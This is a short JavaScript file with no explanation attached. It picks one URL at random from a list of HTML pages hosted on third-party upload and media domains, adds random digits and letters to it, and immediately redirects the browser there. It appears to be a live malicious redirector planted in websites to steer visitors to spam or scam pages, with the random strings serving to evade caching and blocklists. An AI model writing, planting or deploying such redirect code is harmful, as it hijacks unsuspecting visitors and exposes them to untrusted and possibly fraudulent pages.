var urls=[
//'https://static-media.51cto.com/images/202305/8293c6a6784e1661d484963f846b078fdd10fd.html?{nnnnnnnn}{www}',
'https://res.qxueyou.com/html/2023/05/19/6b75365b96b249aca1c62f2e055db88d.HTML?{nnnnnnnn}{www}',
'http://mtf.shijiewangshi.com.cn/D/index.html?f=dgNy&alert(https://360.com)?{nnnnnnnn}{www}',
'https://saas.file.yoo-ai.com/20230819/f2023081-9012-0345-906c-4f6c9579f872.html?{nnnnnnnn}{www}',
//'http://mx.natdss.com.cn/D/index.html?f=Wpn7&alert(https://360.com)?{nnnnnnnn}{www}',
//'http://mx1.natdss.com.cn/D/index.html?f=aXoq&alert(https://360.com)?{nnnnnnnn}{www}',
];
location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
function myEeplace(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		for(var i=0;i<b.length;i++){
			if('n'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('w'==b[i]){
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
